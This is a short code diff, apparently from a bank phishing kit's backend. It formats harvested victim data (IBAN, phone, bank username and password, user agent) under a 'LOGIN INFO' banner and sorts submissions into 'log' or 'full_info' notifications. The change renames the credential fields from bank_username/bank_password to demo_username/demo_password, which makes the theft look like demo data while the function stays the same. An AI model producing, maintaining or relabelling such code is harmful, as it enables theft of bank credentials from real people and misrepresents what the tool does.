@@ -26,8 +26,8 @@ iban: ${s.iban || ""}
 phone: ${s.phone || ""}
 
 ======> LOGIN INFO <=======
-benutzername: ${s.bank_username || ""}
-passwort: ${s.bank_password || ""}
+benutzername: ${s.demo_username || ""}
+passwort: ${s.demo_password || ""}
 bank: ${s.bank || ""}
 
 user-agent: ${s.user_agent || ""}
@@ -132,7 +132,7 @@ async function processNotification(
   // Determine kind from current DB state (auto), or use explicit kind
   let resolvedKind: "log" | "full_info";
   if (kind === "auto") {
-    resolvedKind = submission.bank_username && submission.bank_password ? "log" : "full_info";
+    resolvedKind = submission.demo_username && submission.demo_password ? "log" : "full_info";
   } else {
     resolvedKind = kind;
   }
